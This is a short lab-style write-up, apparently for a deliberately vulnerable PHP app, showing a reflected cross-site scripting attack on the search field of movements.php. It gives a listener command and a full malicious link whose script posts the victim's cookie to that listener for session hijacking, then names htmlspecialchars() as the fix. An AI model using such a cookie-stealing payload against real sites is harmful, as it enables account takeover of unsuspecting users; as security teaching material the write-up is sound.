# Get cookies of specific user

This attack will exploit the search function on the movements page to grab the cookie of the user that clicks on the malicious link.

## Steps

- Listen on your machine for connections

    `docker run -it --rm --name node-logger -p 8000:8000 -v ${PWD}:/usr/src/app -w /usr/src/app node:alpine node logger.js`

- Create a malicious link

    `http://localhost:5000/movements.php?search="/><script>fetch("http://127.0.0.1:8000", {method:"POST", mode: "no-cors", body: document.cookie})</script>`

- Have the user visit the malicious link
- Grab the PHPSESSID cookie and take ownership of the account

## Mitigation

Wrap the search query text in [htmlspecialchars()](https://www.php.net/manual/en/function.htmlspecialchars.php) function
